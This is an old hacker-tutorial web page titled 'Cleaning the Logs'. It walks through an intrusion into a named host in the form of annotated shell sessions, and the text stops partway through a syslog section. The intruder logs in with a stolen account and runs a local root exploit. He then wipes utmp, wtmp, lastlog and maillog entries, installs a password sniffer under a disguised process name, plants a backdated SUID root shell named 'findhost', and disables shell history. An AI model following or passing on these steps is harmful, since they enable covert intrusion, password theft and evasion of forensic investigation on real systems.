<HTML>
<HEAD>
<TITLE>Atomicfrog.com - Hacker Resources - Cleaning the Logs</TITLE>
</HEAD>
<BODY TEXT="#d0d0d0" LINK="#00ff00"" VLINK="#808080" BGCOLOR="#000000">
<B><FONT SIZE=+1>Cleaning the log files</FONT></B><P>Topics:<BR><A HREF="#Walk">A Walk Around A Hacked System</A><BR><A HREF="#Messages and Syslog">Messages and Syslog</A><BR><A HREF="#xferlog">xferlog</A><BR><A HREF="#Cron Table">The Cron Table</A><P><A 
NAME="Walk"></A><B><FONT SIZE=+1>A Walk Around A Hacked System</FONT></B><P>I can't stress the importance of this enough! Clean, Clean!!!!&nbsp;In this section<BR>I will take you on the system first hand and show you some basics onwhat to<BR>look for, and
 on how to wipe your presence from the system.&nbsp; Tostart this lets<BR>logon a system:<P>Here is the step by step through the basic process:<P>******----> see who is on the machine<P>[/home/master]finger @victim.net<BR>[victim.net]<BR>No one logged on.
<P>******----> good no one on, we will log on<P>[/home/master]telnet victim.net<P>Trying xxx.206.xx.140...<BR>Connected to victim.net.<BR>Escape character is '^]'.<P>Welcome to Victim Research Linux (http://www.victim.net) Red Hat 2.1<BR>Kernel 1.2.13 on 
a i586<BR>&nbsp;<P>ns.victim.net login: jnsmith<BR>Password:<BR>Linux 1.2.13.<BR>You have new mail.<P>******----> Don't read his mail, you can cat all mail in /var/spool/mail<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and in each
 users /home/username/mail directory<P>******----> Check again to see if anyone is on<P>[jnsmith@ns jnsmith]$ w<P>5:36am&nbsp; up 18 days,&nbsp; 8:23,&nbsp; 1 user,&nbsp; load average:0.01, 0.00, 0.00<BR>User&nbsp;&nbsp;&nbsp;&nbsp; tty&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;login@&nbsp; idle&nbsp;&nbsp; JCPU&nbsp;&nbsp; PCPU&nbsp; what<BR>jnsmith&nbsp;&nbsp; ttyp1&nbsp;&nbsp;&nbsp;&nbsp; 5:35am&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp;w<P>******----> Just me, lets get root and get lost in the utmp!<P>[jnsmith@ns jnsmith]$ cd .term<P>******----> Nice directory to hide stuff ;)<P>[jnsmith@ns .term]$ ./.u<P>******----> I had this already waiting, it was the umounc.c exploit<P>Di
scovered and Coded by Bloodmask and Vio, Covin 1996<P>******----> We are now root, lets use z2 to become invisible<P>bash# z2 jnsmith<BR>Zap2!<P>******----> Let's see if we are still on ...<P>bash# w<BR>5:37am&nbsp; up 18 days,&nbsp; 8:24,&nbsp; 0 users,&
nbsp; load average:0.08, 0.02, 0.01<BR>User&nbsp;&nbsp;&nbsp;&nbsp; tty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login@&nbsp; idle&nbsp;&nbsp; JCPU&nbsp;&nbsp; PCPU&nbsp; what<P>******----> Hmm. now there is no one on the system, i must have loggedoff ;)<BR>&nb
sp;<P>******----> We know we are root, but lets check you you can see ...<P>bash# whoami<BR>root<BR>bash#<P>******----> Yup, root ..&nbsp; What directory are we in?<P>bash# pwd<BR>/home/jnsmith/.term<P>******----> Let's check the logs<P>bash# cd /var/log<
P>******----> most of the time in /var/adm, this box uses /var/log<P>bash# grep dormroom *<BR>maillog:Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com<BR>maillog:Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhous
e.com<P>******----> Yup, the z2 took care of everything but this maillog ...<P>bash# pico maillog<P>******----> in pico i did a ctrl w, and searched for dormroom then ctrlk to<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delete lin
es<BR>&nbsp;<P>******----> These were the lines deleted<P>Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com<BR>Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com<P>bash# grep dormroom *<P>******----> Yup .. a
ll clear ;)<P>bash# w<BR>5:41am&nbsp; up 18 days,&nbsp; 8:27,&nbsp; 0 users,&nbsp; load average:0.00, 0.00, 0.00<BR>User&nbsp;&nbsp;&nbsp;&nbsp; tty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login@&nbsp; idle&nbsp;&nbsp; JCPU&nbsp;&nbsp; PCPU&nbsp; what<P>******
----> Yup .. all clear here too ;)<P>******----> Lets show you how you would use lled and wted if the grepwould<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;have shown something in those files<P>bash# cd ~jnsmith/.term<BR>bash# lle
d<BR>bash# lled -c dormroom.playhouse<BR>Entries stored: 527 Entries removed: 0<BR>Now chmod lastlog.tmp and copy over the original /var/log/lastlog<P>******----> Nothing in the lastlog<P>bash#<BR>bash# wted -e jnsmith<BR>Entries stored: 254 Entries remov
ed: 0<BR>Now chmod wtmp.tmp and copy over the original /var/log/wtmp<P>******----> Nothing in the wtmp, both of these would have shown in thegrep<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;we just did in the /var/log (just showin
g you the commands)<P>******----> Lets do some sniffing ...<P>bash# pico linsniffer.c<P>******----> I changed this line to tell where i want the log to go:<P>#define TCPLOG "/tmp/.pinetemp.000"<P>******----> lets look at what is running to think of a name
 that<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;looks almost like it belongs there<P>bash# ps -aux<P>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 143&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;84&nbsp;&nbsp;&nbsp; 0&nbsp; ?&nbsp; SW&nbsp; Jan 1
0&nbsp;&nbsp; 0:01 (lpd)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 154&nbsp; 0.0&nbsp; 0.0&nbsp;118&nbsp;&nbsp;&nbsp; 0&nbsp; ?&nbsp; SW&nbsp; Jan 10&nbsp;&nbsp; 0:00(smbd)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 163&nbsp; 0.0&nbsp; 0.5&nbsp;&nbsp;7
6&nbsp; 176&nbsp; ?&nbsp; S&nbsp;&nbsp; Jan 10&nbsp;&nbsp; 0:00 nmbd -D<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 197&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;76&nbsp;&nbsp;&nbsp; 0 v03 SW&nbsp; Jan 10&nbsp;&nbsp; 0:00 (getty)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp; 198&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;76&nbsp;&nbsp;&nbsp; 0 v04 SW&nbsp; Jan 10&nbsp;&nbsp; 0:00 (getty)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 199&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;76&nbsp;&nbsp;&nbsp; 0 v05 SW&nbsp; Jan 10&nbsp;&nbsp; 0:00 (gett
y)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 200&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;76&nbsp;&nbsp;&nbsp; 0 v06 SW&nbsp; Jan 10&nbsp;&nbsp; 0:00 (getty)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 201&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;88&nbsp;&nbsp;&nbsp; 0 s00
 SW&nbsp; Jan 10&nbsp;&nbsp; 0:00 (uugetty)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 209&nbsp; 0.0&nbsp; 0.2&nbsp;&nbsp;35&nbsp;&nbsp; 76&nbsp; ?&nbsp; S&nbsp;&nbsp; Jan 10&nbsp;&nbsp; 0:01 (update)<BR>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 210&nbsp;
 0.0&nbsp; 0.3&nbsp;&nbsp;35&nbsp; 124&nbsp; ?&nbsp; S&nbsp;&nbsp; Jan 10&nbsp;&nbsp; 0:03 update(bdflush)<BR>root&nbsp;&nbsp;&nbsp;&nbsp; 10709&nbsp; 0.0&nbsp; 1.4&nbsp; 152&nbsp;452&nbsp; ?&nbsp; S&nbsp;&nbsp; Jan 27&nbsp;&nbsp; 0:10 httpd<BR>root&nbsp;
&nbsp;&nbsp;&nbsp; 11111&nbsp; 0.0&nbsp; 1.4&nbsp; 152&nbsp;452&nbsp; ?&nbsp; S&nbsp;&nbsp; Jan 27&nbsp;&nbsp; 0:07 httpd<BR>root&nbsp;&nbsp;&nbsp;&nbsp; 14153&nbsp; 0.0&nbsp; 0.8&nbsp;&nbsp;70&nbsp; 268&nbsp; ?&nbsp; S&nbsp;&nbsp; Jan 16&nbsp;&nbsp; 0:03
 ./inetd<BR>root&nbsp;&nbsp;&nbsp;&nbsp; 14307&nbsp; 0.0&nbsp; 4.7 1142 1484&nbsp;?&nbsp; S&nbsp;&nbsp; Jan 16&nbsp;&nbsp; 1:16 ./named<BR>root&nbsp;&nbsp;&nbsp;&nbsp; 14365&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;76&nbsp;&nbsp;&nbsp; 0 v02 SW&nbsp; Jan 16&nbsp;&n
bsp; 0:00 (getty)<BR>root&nbsp;&nbsp;&nbsp;&nbsp; 17367&nbsp; 0.0&nbsp; 1.4&nbsp; 152&nbsp;452&nbsp; ?&nbsp; S&nbsp;&nbsp;&nbsp; 11:01&nbsp;&nbsp; 0:02 httpd<P>******----> lets compile it and name it nmb<P>bash# gcc linsniffer.c -o nmb<P>******----> lets 
load it ...<P>bash# nmb&amp;<BR>[1] 22171<P>******----> lets check the log file in /tmp<P>bash#<BR>bash# cd /tmp<BR>bash# ls -al .pin*<BR>total 15691<BR>-rw-rw-r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; jnsmith&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;0 Jan 29 05:50 .pinetemp.000<P>******----> There it is, but we don't want our login to know about it!<P>bash# chgrp root .pin*<P>******----> Lets look now ....<P>bash# ls -al .pin*<BR>-rw-rw-r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 Jan 29 05:50 .pinttemp.000<BR>bash#<P>******----> This is good, Lets make an SUID shell so we don't have to<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do this ag
ain.&nbsp; (check for MD5 or other programs in the cron)<P>bash# cd /bin<BR>bash# ls -l sh<BR>lrwxrwxrwx&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4 Mar&nbsp; 1&nbsp; 1996 sh -> bash<P
>******----> This is a sym link ...<P>bash# ls -l bash<BR>-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;299296 Nov&nbsp; 2&nbsp; 1995 bash<P>******----> here is the real file ... lets see what to name it tha
t<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;looks like it belongs<P>bash# ls<BR>arch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; df&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ksh&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ping&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar<BR>ash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dmesg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp; ln&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ps&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcsh<BR>bash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dnsdomainname&nbsp;login&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true<BR>cat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;domainname&nbsp;&nbsp;&nbsp;&nbsp; ls&nbsp;&nbsp;&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;red&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ttysnoops<BR>chgrp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb
sp;mail&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;umount<BR>chmod&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mkdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rmdir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uname<BR>chown&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;&nbsp;mknod&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi<BR>cp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;findterm&nbsp;&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp; more&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setserial&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; view<BR>cpio&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gunzip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mo
unt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vim<BR>csh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gzip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp; mt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; zcat<BR>date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hostname&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp;mv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;su&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zsh<BR>dd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kill&nb
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; netstat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sync<P>******----> How about a new command in linux, most admin's won't know<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;th
e difference ;)&nbsp; We will call it findhost<P>bash# cp bash findhost<P>******----> ok, now lets have a look at our new unix command ...<P>bash# ls -l findhost<BR>-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; jnsmith&nbsp;&nbsp;&nbsp;&nbsp;29929
6 Jan 29 05:59 findhost<P>******----> We need to change the group owner, touch the file date,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and make it SUID<P>bash# chgrp root findhost<BR>bash# ls -l findhost<BR>-rwxr-xr-x&nbsp;&nbs
p; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;299296 Jan 29 05:59 findhost<P>bash# chmod +s findhost<BR>bash# ls -l findhost<BR>-rwsr-sr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;29929
6 Jan 29 05:59 findhost<P>bash# touch -t 111312331995 findhost<BR>bash# ls -l findhost<BR>-rwsr-sr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;299296 Nov 13&nbsp; 1995 findhost<P>bash# ls -l m*<BR>-rwxr-xr-x&nbsp;&
nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64400 Oct 31&nbsp; 1995 mail<BR>-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7689 Nov&nbsp; 2&nbsp; 1995 mkdir<
BR>-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7001 Nov&nbsp; 2&nbsp; 1995 mknod<BR>-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;20272 Nov
&nbsp; 1&nbsp; 1995 more<BR>-rwsr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;26192 Nov&nbsp; 1&nbsp; 1995 mount<BR>-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;8381 Oct 31&nbsp; 1995 mt<BR>-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12753 Nov&nbsp; 2&nbsp; 1995 mv<P>******----> Now it looks like it belongs ... lets see if<BR>&nbsp;&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;it gives us root, exit our current root shell..<P>bash# exit<P>[jnsmith@ns .term]$ cd /bin<BR>[jnsmith@ns /bin]$ whoami<BR>jnsmith<BR>[jnsmith@ns /bin]$ findhost<BR>[jnsmith@ns /bin]# whoami<BR>root<P>[jn
smith@ns /bin]# cd<P>******----> cd {enter} takes us back to our home dir<P>[jnsmith@ns jnsmith]# ls<BR>mail<BR>[jnsmith@ns jnsmith]# echo + +>test<BR>[jnsmith@ns jnsmith]# ls -l<BR>total 2<BR>drwx------&nbsp;&nbsp; 2 jnsmith&nbsp;&nbsp; jnsmith&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;1024 Jan 11 22:47 mail<BR>-rw-rw-r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4 Jan 29 06:11 test<P>******----> See now we are uid=0 gid=0<P>[jnsmith@n
s jnsmith]# rm test<P>******----> clean as we go .....<P>[jnsmith@ns jnsmith]# w<BR>6:12am&nbsp; up 18 days,&nbsp; 8:58,&nbsp; 0 users,&nbsp; load average:0.07, 0.02, 0.00<BR>User&nbsp;&nbsp;&nbsp;&nbsp; tty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login@&nbsp;
 idle&nbsp;&nbsp; JCPU&nbsp;&nbsp; PCPU&nbsp; what<P>******----> Just making sure we are still alone ....<P>[jnsmith@ns jnsmith]# ls -al /tmp/.p*<BR>total 15692<BR>-rw-rw-r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp;157 Jan 29 06:10 .pinttemp.000<P>******----> were getting passwords already ;)<P>[jnsmith@ns jnsmith]# ls -al<BR>total 32<BR>drwxrwx---&nbsp;&nbsp; 5 jnsmith&nbsp;&nbsp; jnsmith&nbsp;&nbsp; 1024Jan 29 06:11 .<BR>drwxr-xr-x&nbsp; 33 ro
ot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; users&nbsp;&nbsp;&nbsp;&nbsp;1024 Jan 22 16:53 ..<BR>-rw-r-----&nbsp;&nbsp; 1 jnsmith&nbsp;&nbsp; jnsmith&nbsp;&nbsp; 1126Aug 23&nbsp; 1995 .Xdefaults<BR>lrwxrwxrwx&nbsp;&nbsp; 1 jnsmith&nbsp;&nbsp; jnsmith&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;9 Jan&nbsp; 1 21:40 .bash_history -> /dev/null<BR>-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jnsmith&nbsp;&nbsp;&nbsp;&nbsp;24 Jan&nbsp; 1 03:12 .bash_logout<BR>-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jns
mith&nbsp;&nbsp;&nbsp;220 Jan&nbsp; 1 03:12 .bash_profile<BR>-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jnsmith&nbsp;&nbsp;&nbsp;124 Jan&nbsp; 1 03:12 .bashrc<BR>-rw-rw-r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jnsmith&nbsp;&nb
sp;5433 Jan 11 22:47 .pinerc<BR>drwxrwxr-x&nbsp;&nbsp; 2 jnsmith&nbsp;&nbsp; jnsmith&nbsp;&nbsp; 1024Jan 29 06:22 .term<BR>drwxr-x---&nbsp;&nbsp; 2 jnsmith&nbsp;&nbsp; jnsmith&nbsp;&nbsp; 1024Feb 17&nbsp; 1996 .xfm<BR>drwx------&nbsp;&nbsp; 2 jnsmith&nbsp
;&nbsp; jnsmith&nbsp;&nbsp; 1024Jan 11 22:47 mail<BR>[jnsmith@ns jnsmith]#<P>******----> Make sure you place this sys link .bash_history to /dev/nullso<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;you do not leave a history behind.
..<P>This is the command to do it, but make sure you delete the old .bash_history<BR>if it is there.<P>ln -s /dev/null .bash_history<P>Ok logout ...<P>Ok, there is another way!!!!!!<P>If you can remember and make it a practice that you NEVER forget, getus
ed to<BR>this.... EVERY TIME you login to an account type: unset HISTFILE<P>This will tell the system to delete your history file when you logoffthe<BR>system...&nbsp;&nbsp; USE THIS!&nbsp; Get into the practice!&nbsp;DON'T FORGET!<P>-----------<P><A NAME
="Messages and Syslog"></A><B><FONT SIZE=+1>Messages and Syslog</FONT></B><BR>&nbsp;<P>In the log directory you will find a file called 'messages' each systemis<BR>different as far as what is logged to what files or what file name.&nbsp;Make<BR>sure to ch
eck in the /etc/syslog.conf file for additional logging to<BR>remote machines.&nbsp; If this is being done you will see somethinglike this:<P>*.*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@somehostname.xxx<P>Or just to check and see where the log files are going you can viewthis file<BR>/etc/syslog.conf.<P>Here is a sample...<P>bash# more syslog.conf<BR># /et
c/syslog.conf<BR># For info about the format of this file, see "man syslog.conf" (theBSD man<BR># page), and /usr/doc/sysklogd/README.linux.<BR>#<BR># NOTE: YOU HAVE TO USE TABS HERE - NOT SPACES.<BR># I don't know why.<BR>#<P>*.=info;*.=notice&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/var/adm/messages<BR>*.=debug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/var/adm/debug<BR>*.warn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/var/adm/syslog<BR>*.warn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/root/.../syslog<BR>*.=crit;kern.none&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/var/adm/critical<BR>kern.info;kern.!err&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb
